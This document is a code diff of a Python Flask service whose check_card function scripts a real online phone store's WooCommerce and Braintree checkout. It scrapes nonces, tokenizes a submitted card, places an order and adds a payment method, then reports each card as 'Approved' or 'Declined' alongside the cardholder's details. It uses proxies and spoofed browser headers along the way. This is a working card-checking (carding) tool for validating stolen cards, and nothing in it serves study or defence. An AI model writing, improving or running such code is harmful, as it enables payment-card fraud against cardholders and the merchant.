@@ -100,49 +100,41 @@ def check_card():
     if proxy_dict:
         r.proxies.update(proxy_dict)
     
-    url = "https://silvercellwireless.com"
-    
-    params = {
-  'add-to-cart': "893",
-  'variation_id': "1510",
-  'quantity': "1",
-  'wpo-option[option-103]': "a-SnPa5atkwOOgWbTGB8H",
-  'wpo-hidden-fields': "1",
-  'attribute_pa_condition': "certified-phone",
-  'custom_product_id': "885",
-  'quantity': "1",
-  'gtm4wp_product_data': "{\"internal_id\":893,\"item_id\":893,\"item_name\":\"Orbic Simple Flip\",\"sku\":893,\"price\":19,\"stocklevel\":null,\"stockstatus\":\"instock\",\"google_business_vertical\":\"retail\",\"item_category\":\"Phones\",\"item_category2\":\"Basic\",\"id\":893}",
-  'add-to-cart': "893",
-  'product_id': "893",
-  'variation_id': "1510"
-}
-
+    url = "https://silvercellwireless.com/wp-admin/admin-ajax.php"
     payload = {
-  'success_message': "“Travel+Wall+Charger+Type+C”+has+been+added+to+your+cart",
-  'product_sku': "travel_wall_charger_typec",
-  'product_id': "1232",
-  'quantity': "1"
-}
-
+        'action': "blastoff_get_inventory",
+        'custom_product_id': "885"
+    }
+    params = {
+        'add-to-cart': "893",
+        'variation_id': "1510",
+        'quantity': "1",
+        'wpo-option[option-103]': "a-SnPa5atkwOOgWbTGB8H",
+        'wpo-hidden-fields': "1",
+        'attribute_pa_condition': "certified-phone",
+        'custom_product_id': "885",
+        'quantity': "1",
+        'gtm4wp_product_data': "{\"internal_id\":893,\"item_id\":893,\"item_name\":\"Orbic Simple Flip\",\"sku\":893,\"price\":19,\"stocklevel\":null,\"stockstatus\":\"instock\",\"google_business_vertical\":\"retail\",\"item_category\":\"Phones\",\"item_category2\":\"Basic\",\"id\":893}",
+        'add-to-cart': "893",
+        'product_id': "893",
+        'variation_id': "1510"
+    }
     headers = {
-  'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
-  'Accept': "application/json, text/javascript, */*; q=0.01",
-  'sec-ch-ua-platform': "\"Windows\"",
-  'x-requested-with': "XMLHttpRequest",
-  'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
-  'sec-ch-ua-mobile': "?1",
-  'origin': "https://silvercellwireless.com",
-  'sec-fetch-site': "same-origin",
-  'sec-fetch-mode': "cors",
-  'sec-fetch-dest': "empty",
-#  'referer': "https://silvercellwireless.com/shop/page/2/",
-  'accept-language': "en-US,en;q=0.9",
-  'priority': "u=1, i",
-}
+        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
+        'Accept': "application/json, text/javascript, */*; q=0.01",
+        'sec-ch-ua-platform': "\"Windows\"",
+        'x-requested-with': "XMLHttpRequest",
+        'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
+        'sec-ch-ua-mobile': "?1",
+        'origin': "https://silvercellwireless.com",
+        'sec-fetch-site': "same-origin",
+        'sec-fetch-mode': "cors",
+        'sec-fetch-dest': "empty",
+        'accept-language': "en-US,en;q=0.9",
+        'priority': "u=1, i",
+    }
+    response = r.post(url, data=payload, params=params, headers=headers)
 
-    response = r.post(url, params=params, headers=headers)
-
-    
     url = "https://silvercellwireless.com/checkout/"
     headers = {
         'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
@@ -160,25 +152,22 @@ def check_card():
         'priority': "u=0, i",
     }
     response = r.get(url, headers=headers)
-    
-    updatenonce_match = re.search(r'"update_order_review_nonce"\s*:\s*"([^"]+)"', response.text)
-    if not updatenonce_match:
-        return jsonify({'error': 'Update order review nonce not found'}), 400
-    updatenonce = updatenonce_match.group(1)
-    
+
+    updatenonce = re.search(r'"update_order_review_nonce"\s*:\s*"([^"]+)"', response.text).group(1)
+
     soup = BeautifulSoup(response.text, 'html.parser')
     nonce_input = soup.find('input', id='woocommerce-process-checkout-nonce')
-    if not nonce_input:
-        return jsonify({'error': 'Checkout nonce not found'}), 400
-    checkout = nonce_input['value']
-    
+    checkout = nonce_input['value'] if nonce_input else None
+
     soup = BeautifulSoup(response.text, 'html.parser')
     all_text = str(soup)
     match = re.search(r'clientTokenNonce["\']?\s*:\s*["\']([^"\']+)["\']', all_text)
-    if not match:
-        return jsonify({'error': 'Client token nonce not found'}), 400
-    client_token_nonce = match.group(1)
-    
+    client_token_nonce = match.group(1) if match else None
+
+    print(checkout)
+    print(updatenonce)
+    print(client_token_nonce)
+
     url = "https://silvercellwireless.com/wp-admin/admin-ajax.php"
     payload = {
         'action': "blastoff_braintree_vault_client_token",
@@ -199,12 +188,12 @@ def check_card():
         'priority': "u=1, i",
     }
     response = r.post(url, data=payload, headers=headers)
-    
+
     token1 = None
     if response.status_code == 200:
         result = response.json()
         if result.get('success'):
-            token_data = json.loads(base64.b64decode(result['data']).decode('utf-8'))
+            token_data = json.loads(base64.b64decode(result['data']['client_token']).decode('utf-8'))
             auth = token_data.get('authorizationFingerprint')
             braintree_session_id = ''.join(random.choices('abcdef0123456789', k=32))
             
@@ -249,16 +238,9 @@ def check_card():
                 result = response.json()
                 if 'errors' not in result:
                     token1 = result['data']['tokenizeCreditCard']['token']
-                else:
-                    return jsonify({'error': 'Card tokenization failed', 'details': result['errors']}), 400
-            else:
-                return jsonify({'error': 'Braintree API error', 'status': response.status_code}), 400
-        else:
-            return jsonify({'error': 'Failed to get client token'}), 400
-    else:
-        return jsonify({'error': 'Admin AJAX error', 'status': response.status_code}), 400
-    
+
     if token1:
+        print(token1)
         url = "https://silvercellwireless.com"
         params = {'wc-ajax': "update_order_review"}
         payload = {
@@ -295,7 +277,7 @@ def check_card():
             'priority': "u=1, i",
         }
         response = r.post(url, params=params, data=payload, headers=headers)
-        
+
         url = "https://silvercellwireless.com"
         params = {'wc-ajax': "checkout"}
         payload = {
@@ -313,19 +295,19 @@ def check_card():
             'wc_order_attribution_utm_source_platform': "(none)",
             'wc_order_attribution_utm_creative_format': "(none)",
             'wc_order_attribution_utm_marketing_tactic': "(none)",
-            'wc_order_attribution_session_entry': "https://silvercellwireless.com/my-account/add-payment-method/",
-            'wc_order_attribution_session_start_time': "2026-06-30+15:09:55",
-            'wc_order_attribution_session_pages': "10",
+            'wc_order_attribution_session_entry': "https://silvercellwireless.com/products",
+            'wc_order_attribution_session_start_time': "2026-07-10+15:32:01",
+            'wc_order_attribution_session_pages': "5",
             'wc_order_attribution_session_count': "1",
-            'wc_order_attribution_user_agent': "Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/148.0.0.0+Safari/537.36",
-            'service_first_name': first_name,
-            'service_last_name': last_name,
+            'wc_order_attribution_user_agent': "Mozilla/5.0+(Linux;+Android+10;+K)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/148.0.0.0+Mobile+Safari/537.36",
+            'service_first_name': "Erik",
+            'service_last_name': "Ragara",
             'service_country': "US",
-            'service_address_1': addr['address'],
+            'service_address_1': "123+Allen+Street",
             'service_address_2': "",
-            'service_city': addr['city'],
-            'service_state': addr['state'],
-            'service_postcode': addr['zip'],
+            'service_city': "New+York",
+            'service_state': "NY",
+            'service_postcode': "10001",
             'payment_method': "blastoff_braintree_vault",
             'blastoff_braintree_vault_saved_token_id': "new",
             'blastoff_braintree_vault_payment_nonce': token1,
@@ -334,147 +316,148 @@ def check_card():
             '_wp_http_referer': "/?wc-ajax=update_order_review",
             'shipping_method[0]': "flat_rate:1"
         }
+
         headers = {
-            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
+            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
             'Accept': "application/json, text/javascript, */*; q=0.01",
-            'sec-ch-ua-platform': "\"Windows\"",
+            'sec-ch-ua-platform': "\"Android\"",
             'x-requested-with': "XMLHttpRequest",
             'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
-            'sec-ch-ua-mobile': "?0",
+            'sec-ch-ua-mobile': "?1",
             'origin': "https://silvercellwireless.com",
             'sec-fetch-site': "same-origin",
             'sec-fetch-mode': "cors",
             'sec-fetch-dest': "empty",
             'referer': "https://silvercellwireless.com/checkout/",
-            'accept-language': "en-US,en;q=0.9",
+            'accept-language': "en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5",
             'priority': "u=1, i",
         }
         response = r.post(url, params=params, data=payload, headers=headers)
-    
-    url = "https://silvercellwireless.com/my-account/set-password/"
-    payload = {
-        'new_password': "DDcc55@&#",
-        'reenter_password': "DDcc55@&#",
-        'new_woo_pin': "1234",
-        'question1': "5",
-        'question1_answer': "None"
-    }
-    headers = {
-        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
-        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        'cache-control': "max-age=0",
-        'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
-        'sec-ch-ua-mobile': "?0",
-        'sec-ch-ua-platform': "\"Windows\"",
-        'upgrade-insecure-requests': "1",
-        'origin': "https://silvercellwireless.com",
-        'sec-fetch-site': "same-origin",
-        'sec-fetch-mode': "navigate",
-        'sec-fetch-user': "?1",
-        'sec-fetch-dest': "document",
-        'referer': "https://silvercellwireless.com/my-account/set-password/",
-        'accept-language': "en-US,en;q=0.9",
-        'priority': "u=0, i",
-    }
-    response = r.post(url, data=payload, headers=headers)
-    
-    url = "https://silvercellwireless.com/my-account/add-payment-method/"
-    headers = {
-        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
-        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
-        'sec-ch-ua-mobile': "?0",
-        'sec-ch-ua-platform': "\"Windows\"",
-        'upgrade-insecure-requests': "1",
-        'sec-fetch-site': "none",
-        'sec-fetch-mode': "navigate",
-        'sec-fetch-user': "?1",
-        'sec-fetch-dest': "document",
-        'accept-language': "en-US,en;q=0.9",
-        'priority': "u=0, i",
-    }
-    response = r.get(url, headers=headers)
-    
-    soup = BeautifulSoup(response.text, 'html.parser')
-    nonce_input = soup.find('input', id='woocommerce-add-payment-method-nonce')
-    if not nonce_input:
-        return jsonify({'error': 'Add payment method nonce not found'}), 400
-    nonce_value3 = nonce_input['value']
-    
-    url = "https://silvercellwireless.com/my-account/add-payment-method/"
-    payload = {
-        'payment_method': "braintree_credit_card",
-        'wc-braintree-credit-card-card-type': "visa",
-        'wc-braintree-credit-card-3d-secure-enabled': "",
-        'wc-braintree-credit-card-3d-secure-verified': "",
-        'wc-braintree-credit-card-3d-secure-order-total': "13.82",
-        'wc_braintree_credit_card_payment_nonce': token1,
-        'wc_braintree_device_data': "{\"correlation_id\":\"1eb04af3-552c-43b0-8828-a47d1349\"}",
-        'wc-braintree-credit-card-tokenize-payment-method': "true",
-        'billing_first_name': first_name,
-        'billing_last_name': last_name,
-        'billing_country': "US",
-        'billing_address_1': addr['address'],
-        'billing_address_2': "",
-        'billing_city': addr['city'],
-        'billing_state': addr['state'],
-        'billing_postcode': addr['zip'],
-        'billing_email': email,
-        'woocommerce-add-payment-method-nonce': nonce_value3,
-        '_wp_http_referer': "/my-account/add-payment-method/",
-        'woocommerce_add_payment_method': "1"
-    }
-    headers = {
-        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
-        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        'cache-control': "max-age=0",
-        'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
-        'sec-ch-ua-mobile': "?0",
-        'sec-ch-ua-platform': "\"Windows\"",
-        'upgrade-insecure-requests': "1",
-        'origin': "https://silvercellwireless.com",
-        'sec-fetch-site': "same-origin",
-        'sec-fetch-mode': "navigate",
-        'sec-fetch-user': "?1",
-        'sec-fetch-dest': "document",
-        'referer': "https://silvercellwireless.com/my-account/add-payment-method/",
-        'accept-language': "en-US,en;q=0.9",
-        'priority': "u=0, i",
-    }
-    response = r.post(url, data=payload, headers=headers)
-    
-    response_text = response.text
-    
-    if re.search(r'(?i)avs', response_text) or re.search(r'(?i)nice', response_text):
-        result = "Approved ✅"
-    else:
-        soup = BeautifulSoup(response_text, 'html.parser')
-        error_element = soup.find('ul', class_='woocommerce-error')
-        error_message = None
-        if error_element:
-            li_items = error_element.find_all('li')
-            error_messages = []
-            for li in li_items:
-                text = li.text.strip()
-                if text:
-                    error_messages.append(text)
-            if error_messages:
-                error_message = " | ".join(error_messages)
         
-        if error_message:
-            result = f"Declined ❌: {error_message}"
+        url = "https://silvercellwireless.com/my-account/set-password/"
+        payload = {
+            'new_password': "DDcc55@&#",
+            'reenter_password': "DDcc55@&#",
+            'new_woo_pin': "1234",
+            'question1': "5",
+            'question1_answer': "None"
+        }
+        headers = {
+            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
+            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            'cache-control': "max-age=0",
+            'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
+            'sec-ch-ua-mobile': "?0",
+            'sec-ch-ua-platform': "\"Windows\"",
+            'upgrade-insecure-requests': "1",
+            'origin': "https://silvercellwireless.com",
+            'sec-fetch-site': "same-origin",
+            'sec-fetch-mode': "navigate",
+            'sec-fetch-user': "?1",
+            'sec-fetch-dest': "document",
+            'referer': "https://silvercellwireless.com/my-account/set-password/",
+            'accept-language': "en-US,en;q=0.9",
+            'priority': "u=0, i",
+        }
+        response = r.post(url, data=payload, headers=headers)
+        
+        url = "https://silvercellwireless.com/my-account/add-payment-method/"
+        headers = {
+            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
+            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
+            'sec-ch-ua-mobile': "?0",
+            'sec-ch-ua-platform': "\"Windows\"",
+            'upgrade-insecure-requests': "1",
+            'sec-fetch-site': "none",
+            'sec-fetch-mode': "navigate",
+            'sec-fetch-user': "?1",
+            'sec-fetch-dest': "document",
+            'accept-language': "en-US,en;q=0.9",
+            'priority': "u=0, i",
+        }
+        response = r.get(url, headers=headers)
+        
+        soup = BeautifulSoup(response.text, 'html.parser')
+        nonce_input = soup.find('input', id='woocommerce-add-payment-method-nonce')
+        if not nonce_input:
+            return jsonify({'error': 'Add payment method nonce not found'}), 400
+        nonce_value3 = nonce_input['value']
+        
+        url = "https://silvercellwireless.com/my-account/add-payment-method/"
+        payload = {
+            'payment_method': "braintree_credit_card",
+            'wc-braintree-credit-card-card-type': "visa",
+            'wc-braintree-credit-card-3d-secure-enabled': "",
+            'wc-braintree-credit-card-3d-secure-verified': "",
+            'wc-braintree-credit-card-3d-secure-order-total': "13.82",
+            'wc_braintree_credit_card_payment_nonce': token1,
+            'wc_braintree_device_data': "{\"correlation_id\":\"1eb04af3-552c-43b0-8828-a47d1349\"}",
+            'wc-braintree-credit-card-tokenize-payment-method': "true",
+            'billing_first_name': first_name,
+            'billing_last_name': last_name,
+            'billing_country': "US",
+            'billing_address_1': addr['address'],
+            'billing_address_2': "",
+            'billing_city': addr['city'],
+            'billing_state': addr['state'],
+            'billing_postcode': addr['zip'],
+            'billing_email': email,
+            'woocommerce-add-payment-method-nonce': nonce_value3,
+            '_wp_http_referer': "/my-account/add-payment-method/",
+            'woocommerce_add_payment_method': "1"
+        }
+        headers = {
+            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
+            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            'cache-control': "max-age=0",
+            'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
+            'sec-ch-ua-mobile': "?0",
+            'sec-ch-ua-platform': "\"Windows\"",
+            'upgrade-insecure-requests': "1",
+            'origin': "https://silvercellwireless.com",
+            'sec-fetch-site': "same-origin",
+            'sec-fetch-mode': "navigate",
+            'sec-fetch-user': "?1",
+            'sec-fetch-dest': "document",
+            'referer': "https://silvercellwireless.com/my-account/add-payment-method/",
+            'accept-language': "en-US,en;q=0.9",
+            'priority': "u=0, i",
+        }
+        response = r.post(url, data=payload, headers=headers)
+        
+        response_text = response.text
+        
+        if re.search(r'(?i)avs', response_text) or re.search(r'(?i)nice', response_text):
+            result = "Approved ✅"
         else:
-            result = "Declined ❌: Unknown error"
-    
-    return jsonify({
-        'result': result,
-        'card': cc,
-        'email': email,
-        'first_name': first_name,
-        'last_name': last_name,
-        'address': addr,
-        'proxy_used': proxy_string if proxy_dict else None
-    }), 200
+            soup = BeautifulSoup(response_text, 'html.parser')
+            error_element = soup.find('ul', class_='woocommerce-error')
+            error_message = None
+            if error_element:
+                li_items = error_element.find_all('li')
+                error_messages = []
+                for li in li_items:
+                    text = li.text.strip()
+                    if text:
+                        error_messages.append(text)
+                if error_messages:
+                    error_message = " | ".join(error_messages)
+            
+            if error_message:
+                result = f"Declined ❌: {error_message}"
+            else:
+                result = "Declined ❌: Unknown error"
+        
+        return jsonify({
+            'result': result,
+            'card': cc,
+            'email': email,
+            'first_name': first_name,
+            'last_name': last_name,
+            'address': addr,
+            'proxy_used': proxy_string if proxy_dict else None
+        }), 200
 
 @app.route('/health', methods=['GET'])
 def health():
